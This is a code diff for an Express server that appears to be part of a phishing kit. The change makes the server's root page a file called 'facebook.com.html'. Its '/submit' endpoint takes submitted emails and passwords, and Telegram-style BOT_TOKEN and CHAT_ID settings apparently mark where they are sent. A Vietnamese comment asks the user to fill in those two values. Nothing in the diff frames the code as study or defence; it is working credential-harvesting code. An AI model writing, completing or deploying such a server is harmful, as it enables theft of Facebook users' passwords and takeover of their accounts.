@@ -8,7 +8,7 @@ app.use(express.json());
 app.use(cors());
 
 // 🔥 THAY 2 CÁI NÀY
-const BOT_TOKEN =process.env.BOT_TOKEN;
+const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 app.post("/submit", async (req, res) => {
   const { password, email } = req.body;
@@ -27,7 +27,11 @@ app.post("/submit", async (req, res) => {
 });
 
 const port = process.env.PORT || 3000;
+const path = require("path");
 
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "facebook.com.html"));
+});
 app.listen(port, () => {
   console.log("Server running...");
 });
